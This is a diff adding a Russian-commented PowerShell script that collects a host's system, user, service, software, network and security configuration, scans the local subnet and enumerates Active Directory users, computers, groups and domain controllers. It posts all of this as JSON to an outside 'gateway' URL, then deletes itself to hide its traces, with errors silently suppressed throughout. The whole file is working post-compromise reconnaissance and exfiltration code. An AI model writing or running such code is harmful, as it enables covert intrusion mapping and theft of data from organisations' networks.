@@ -1,0 +1,468 @@
+# DomainInfoCollector.ps1
+param(
+    [Parameter(Mandatory=$true)]
+    [string]$GatewayUrl
+)
+
+# Функция для самоудаления скрипта
+function Remove-Self {
+    try {
+        $scriptPath = $MyInvocation.MyCommand.Path
+        Start-Job -ScriptBlock {
+            param($path)
+            Start-Sleep -Seconds 5
+            Remove-Item -Path $path -Force -ErrorAction SilentlyContinue
+        } -ArgumentList $scriptPath | Out-Null
+    }
+    catch {
+        # Игнорируем ошибки удаления
+    }
+}
+
+# Функция для проверки членства в домене
+function Test-DomainMember {
+    try {
+        $computerInfo = Get-WmiObject -Class Win32_ComputerSystem
+        return $computerInfo.PartOfDomain
+    }
+    catch {
+        return $false
+    }
+}
+
+# Функция для проверки прав администратора
+function Test-Administrator {
+    $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
+    return $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+}
+
+# Функция для проверки доступности модуля AD
+function Test-ADModule {
+    return (Get-Module -ListAvailable -Name ActiveDirectory) -ne $null
+}
+
+# Функция для получения детальной информации о системе
+function Get-DetailedSystemInfo {
+    $computerInfo = Get-WmiObject -Class Win32_ComputerSystem
+    $osInfo = Get-WmiObject -Class Win32_OperatingSystem
+    $biosInfo = Get-WmiObject -Class Win32_BIOS
+    $processorInfo = Get-WmiObject -Class Win32_Processor
+    $memoryModules = Get-WmiObject -Class Win32_PhysicalMemory
+    $disks = Get-WmiObject -Class Win32_LogicalDisk
+    $networkAdapters = Get-NetAdapter | Where-Object {$_.Status -eq 'Up'}
+    $services = Get-Service | Where-Object {$_.Status -eq 'Running'}
+    $processes = Get-Process | Select-Object Name, Id, CPU, WorkingSet -First 50
+    $hotfixes = Get-HotFix | Select-Object HotFixID, InstalledOn -First 20
+    $installedSoftware = Get-WmiObject -Class Win32_Product | Select-Object Name, Version, Vendor -First 30
+    $scheduledTasks = Get-ScheduledTask | Where-Object {$_.State -eq 'Ready'} | Select-Object TaskName, TaskPath -First 20
+    $firewallProfiles = Get-NetFirewallProfile
+    $shares = Get-SmbShare
+    $localGroups = Get-LocalGroup
+    $networkConnections = Get-NetTCPConnection | Where-Object {$_.State -eq 'Established'} | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, State -First 20
+    
+    $totalMemory = ($memoryModules | Measure-Object -Property Capacity -Sum).Sum / 1GB
+    
+    return @{
+        ComputerName = $env:COMPUTERNAME
+        DomainMember = Test-DomainMember
+        UserName = $env:USERNAME
+        UserDomain = $env:USERDOMAIN
+        IsAdmin = Test-Administrator
+        SystemInfo = @{
+            Manufacturer = $computerInfo.Manufacturer
+            Model = $computerInfo.Model
+            TotalPhysicalMemory = [math]::Round($totalMemory, 2)
+            NumberOfProcessors = $computerInfo.NumberOfProcessors
+            Processor = $processorInfo[0].Name
+            BIOS = @{
+                SerialNumber = $biosInfo.SerialNumber
+                Version = $biosInfo.Version
+                Manufacturer = $biosInfo.Manufacturer
+            }
+        }
+        OSInfo = @{
+            Caption = $osInfo.Caption
+            Version = $osInfo.Version
+            BuildNumber = $osInfo.BuildNumber
+            InstallDate = $osInfo.ConvertToDateTime($osInfo.InstallDate)
+            LastBootTime = $osInfo.ConvertToDateTime($osInfo.LastBootUpTime)
+            RegisteredUser = $osInfo.RegisteredUser
+            SerialNumber = $osInfo.SerialNumber
+        }
+        Storage = @($disks | ForEach-Object {
+            @{
+                DeviceID = $_.DeviceID
+                Size = [math]::Round($_.Size / 1GB, 2)
+                FreeSpace = [math]::Round($_.FreeSpace / 1GB, 2)
+                FileSystem = $_.FileSystem
+            }
+        })
+        NetworkInfo = @($networkAdapters | ForEach-Object {
+            $adapterStats = Get-NetAdapterStatistics -Name $_.Name
+            $ipAddresses = Get-NetIPAddress -InterfaceIndex $_.InterfaceIndex -AddressFamily IPv4
+            @{
+                Name = $_.Name
+                InterfaceDescription = $_.InterfaceDescription
+                MacAddress = $_.MacAddress
+                LinkSpeed = $_.LinkSpeed
+                Status = $_.Status
+                ReceivedBytes = $adapterStats.ReceivedBytes
+                SentBytes = $adapterStats.SentBytes
+                IPAddresses = @($ipAddresses | ForEach-Object { $_.IPAddress })
+            }
+        })
+        LocalUsers = @(Get-LocalUser | ForEach-Object {
+            @{
+                Name = $_.Name
+                Enabled = $_.Enabled
+                LastLogon = $_.LastLogon
+                Description = $_.Description
+                SID = $_.SID
+            }
+        })
+        LocalGroups = @($localGroups | ForEach-Object {
+            @{
+                Name = $_.Name
+                Description = $_.Description
+                SID = $_.SID
+            }
+        })
+        RunningServices = @($services | ForEach-Object {
+            @{
+                Name = $_.Name
+                DisplayName = $_.DisplayName
+                Status = $_.Status
+                StartType = (Get-WmiObject -Class Win32_Service -Filter "Name='$($_.Name)'").StartMode
+            }
+        })
+        Processes = @($processes | ForEach-Object {
+            @{
+                Name = $_.Name
+                Id = $_.Id
+                CPU = $_.CPU
+                WorkingSet = [math]::Round($_.WorkingSet / 1MB, 2)
+            }
+        })
+        Hotfixes = @($hotfixes | ForEach-Object {
+            @{
+                HotFixID = $_.HotFixID
+                InstalledOn = $_.InstalledOn
+            }
+        })
+        InstalledSoftware = @($installedSoftware | ForEach-Object {
+            @{
+                Name = $_.Name
+                Version = $_.Version
+                Vendor = $_.Vendor
+            }
+        })
+        ScheduledTasks = @($scheduledTasks | ForEach-Object {
+            @{
+                TaskName = $_.TaskName
+                TaskPath = $_.TaskPath
+            }
+        })
+        FirewallProfiles = @($firewallProfiles | ForEach-Object {
+            @{
+                Name = $_.Name
+                Enabled = $_.Enabled
+                DefaultInboundAction = $_.DefaultInboundAction
+                DefaultOutboundAction = $_.DefaultOutboundAction
+            }
+        })
+        Shares = @($shares | ForEach-Object {
+            @{
+                Name = $_.Name
+                Path = $_.Path
+                Description = $_.Description
+            }
+        })
+        NetworkConnections = @($networkConnections | ForEach-Object {
+            @{
+                LocalAddress = $_.LocalAddress
+                LocalPort = $_.LocalPort
+                RemoteAddress = $_.RemoteAddress
+                RemotePort = $_.RemotePort
+                State = $_.State
+            }
+        })
+    }
+}
+
+# Функция для сканирования сети
+function Get-NetworkMap {
+    $networkInfo = @{
+        LocalSubnet = @()
+        ARPTable = @()
+        NetworkRoutes = @()
+        DNSInfo = @()
+        NetworkDiscovery = @()
+    }
+    
+    try {
+        # Получаем информацию о сетевых интерфейсах
+        $ipAddresses = Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.IPAddress -ne '127.0.0.1'}
+        foreach ($ip in $ipAddresses) {
+            $subnet = $ip.IPAddress -replace '\.\d+$', '.0/24'
+            $networkInfo.LocalSubnet += @{
+                Interface = $ip.InterfaceAlias
+                IPAddress = $ip.IPAddress
+                Subnet = $subnet
+            }
+        }
+        
+        # ARP таблица
+        $arpEntries = arp -a | Where-Object {$_ -match '\d+\.\d+\.\d+\.\d+'}
+        foreach ($entry in $arpEntries) {
+            if ($entry -match '(\d+\.\d+\.\d+\.\d+)\s+([a-fA-F0-9-]+)\s+(\w+)') {
+                $networkInfo.ARPTable += @{
+                    IPAddress = $matches[1]
+                    MACAddress = $matches[2]
+                    Type = $matches[3]
+                }
+            }
+        }
+        
+        # Таблица маршрутизации
+        $routes = Get-NetRoute -AddressFamily IPv4 | Where-Object {$_.NextHop -ne '0.0.0.0'}
+        foreach ($route in $routes) {
+            $networkInfo.NetworkRoutes += @{
+                Destination = $route.DestinationPrefix
+                NextHop = $route.NextHop
+                Interface = $route.InterfaceAlias
+            }
+        }
+        
+        # DNS информация
+        $dnsServers = Get-DnsClientServerAddress -AddressFamily IPv4 | Where-Object {$_.ServerAddresses.Count -gt 0}
+        foreach ($dns in $dnsServers) {
+            $networkInfo.DNSInfo += @{
+                Interface = $dns.InterfaceAlias
+                DNSServers = $dns.ServerAddresses
+            }
+        }
+        
+        # Простое сканирование сети (первые 10 адресов в подсети)
+        foreach ($subnet in $networkInfo.LocalSubnet) {
+            $baseIP = $subnet.IPAddress -replace '\.\d+$', '.'
+            for ($i = 1; $i -le 10; $i++) {
+                $testIP = $baseIP + $i
+                if (Test-Connection -ComputerName $testIP -Count 1 -Quiet -TimeoutSeconds 1) {
+                    try {
+                        $hostname = [System.Net.Dns]::GetHostEntry($testIP).HostName
+                    }
+                    catch {
+                        $hostname = "Unknown"
+                    }
+                    
+                    $networkInfo.NetworkDiscovery += @{
+                        IPAddress = $testIP
+                        Hostname = $hostname
+                        Status = "Online"
+                    }
+                }
+            }
+        }
+    }
+    catch {
+        # Игнорируем ошибки сканирования сети
+    }
+    
+    return $networkInfo
+}
+
+# Функция для получения информации о домене
+function Get-DomainInfo {
+    $domainInfo = @{
+        DomainAvailable = $false
+    }
+    
+    try {
+        if (-not (Test-ADModule)) {
+            $currentDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+            $domainInfo.DomainAvailable = $true
+            $domainInfo.DomainName = $currentDomain.Name
+            $domainInfo.ForestName = $currentDomain.Forest.Name
+            $domainInfo.DomainControllers = @($currentDomain.DomainControllers | ForEach-Object {
+                @{
+                    Name = $_.Name
+                    Site = $_.SiteName
+                    IPAddress = $_.IPAddress
+                }
+            })
+            return $domainInfo
+        }
+        
+        Import-Module ActiveDirectory -ErrorAction Stop
+        
+        $domain = Get-ADDomain
+        $domainControllers = Get-ADDomainController -Filter *
+        $domainUsers = Get-ADUser -Filter * -Properties Created, LastLogonDate, PasswordLastSet -ResultSetSize 50
+        $domainComputers = Get-ADComputer -Filter * -Properties Created, LastLogonDate -ResultSetSize 50
+        $domainGroups = Get-ADGroup -Filter * -Properties Members -ResultSetSize 20
+        
+        $domainInfo.DomainAvailable = $true
+        $domainInfo.DomainName = $domain.DNSRoot
+        $domainInfo.NetBIOSName = $domain.NetBIOSName
+        $domainInfo.DomainMode = $domain.DomainMode
+        $domainInfo.Forest = $domain.Forest
+        $domainInfo.Created = $domain.Created
+        $domainInfo.DistinguishedName = $domain.DistinguishedName
+        
+        $domainInfo.DomainControllers = @($domainControllers | ForEach-Object {
+            @{
+                Name = $_.Name
+                IPAddress = $_.IPv4Address
+                Site = $_.Site
+                OperatingSystem = $_.OperatingSystem
+            }
+        })
+        
+        $domainInfo.DomainUsers = @($domainUsers | ForEach-Object {
+            @{
+                SamAccountName = $_.SamAccountName
+                DisplayName = $_.DisplayName
+                Enabled = $_.Enabled
+                LastLogonDate = $_.LastLogonDate
+                PasswordLastSet = $_.PasswordLastSet
+                Created = $_.Created
+            }
+        })
+        
+        $domainInfo.DomainComputers = @($domainComputers | ForEach-Object {
+            @{
+                Name = $_.Name
+                Enabled = $_.Enabled
+                OperatingSystem = $_.OperatingSystem
+                LastLogonDate = $_.LastLogonDate
+                Created = $_.Created
+            }
+        })
+        
+        $domainInfo.DomainGroups = @($domainGroups | ForEach-Object {
+            @{
+                Name = $_.Name
+                GroupCategory = $_.GroupCategory
+                GroupScope = $_.GroupScope
+                MemberCount = $_.Members.Count
+            }
+        })
+        
+    }
+    catch {
+        $domainInfo.DomainAvailable = $false
+    }
+    
+    return $domainInfo
+}
+
+# Функция для получения информации о безопасности
+function Get-SecurityInfo {
+    $securityInfo = @{
+        AuditPolicy = @()
+        UserRights = @()
+        EventLogs = @()
+        UACSettings = @()
+    }
+    
+    try {
+        # Политика аудита
+        $auditPolicy = auditpol /get /category:* | Where-Object {$_ -match '^  .*'}
+        foreach ($line in $auditPolicy) {
+            if ($line -match '^  (\w.+)\s+(\w+)\s+(\w+)\s+(\w+)') {
+                $securityInfo.AuditPolicy += @{
+                    Category = $matches[1].Trim()
+                    Setting = $matches[2]
+                }
+            }
+        }
+        
+        # Настройки UAC
+        $uacSettings = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
+        $securityInfo.UACSettings = @{
+            EnableLUA = $uacSettings.EnableLUA
+            ConsentPromptBehaviorAdmin = $uacSettings.ConsentPromptBehaviorAdmin
+            PromptOnSecureDesktop = $uacSettings.PromptOnSecureDesktop
+        }
+        
+        # Последние события безопасности
+        $securityEvents = Get-WinEvent -LogName Security -MaxEvents 10 -ErrorAction SilentlyContinue
+        foreach ($event in $securityEvents) {
+            $securityInfo.EventLogs += @{
+                TimeCreated = $event.TimeCreated
+                Id = $event.Id
+                Level = $event.LevelDisplayName
+                Task = $event.TaskDisplayName
+            }
+        }
+    }
+    catch {
+        # Игнорируем ошибки безопасности
+    }
+    
+    return $securityInfo
+}
+
+# Функция для отправки данных на шлюз
+function Send-ToGateway {
+    param(
+        [object]$Data,
+        [string]$Url
+    )
+    
+    try {
+        $jsonData = $Data | ConvertTo-Json -Depth 10 -Compress
+        
+        $headers = @{
+            "Content-Type" = "application/json"
+            "Accept" = "application/json"
+        }
+        
+        $response = Invoke-RestMethod -Uri $Url -Method Post -Body $jsonData -Headers $headers -TimeoutSec 30
+        return $true
+    }
+    catch {
+        return $false
+    }
+}
+
+# Основная логика скрипта
+try {
+    # Собираем всю информацию
+    $collectedData = @{
+        Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+        CollectionContext = @{
+            ComputerName = $env:COMPUTERNAME
+            UserName = $env:USERNAME
+            UserDomain = $env:USERDOMAIN
+            IsDomainMember = Test-DomainMember
+            IsAdministrator = Test-Administrator
+            HasADModule = Test-ADModule
+        }
+        SystemInfo = Get-DetailedSystemInfo
+        NetworkMap = Get-NetworkMap
+        DomainInfo = Get-DomainInfo
+        SecurityInfo = Get-SecurityInfo
+        EnvironmentVariables = @{
+            Path = $env:PATH
+            Temp = $env:TEMP
+            UserProfile = $env:USERPROFILE
+            SystemRoot = $env:SystemRoot
+        }
+    }
+    
+    # Отправляем данные на шлюз
+    $sendResult = Send-ToGateway -Data $collectedData -Url $GatewayUrl
+    
+    # Самоудаление скрипта
+    Remove-Self
+    
+    if (-not $sendResult) {
+        exit 1
+    }
+}
+catch {
+    # Самоудаление даже при ошибке
+    Remove-Self
+    exit 1
+}
